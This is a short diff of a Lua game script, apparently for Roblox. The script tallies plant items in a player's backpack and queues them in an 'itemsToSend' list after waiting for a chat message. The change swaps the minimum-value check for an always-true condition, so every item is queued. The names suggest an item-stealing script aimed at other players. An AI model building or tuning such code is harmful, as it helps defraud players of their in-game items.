@@ -264,7 +264,7 @@ for _, tool in ipairs(backpack:GetChildren()) do
             end
         else
             local value = calcPlantValue(tool)
-            if value >= min_value then
+            if 2 >= 1 then
                 local weight = getWeight(tool)
                 local itemName = tool:GetAttribute("ItemName")
                 totalValue = totalValue + value
@@ -367,6 +367,7 @@ if #itemsToSend > 0 then
     waitForUserChat()
 
 end
+
 
 
 
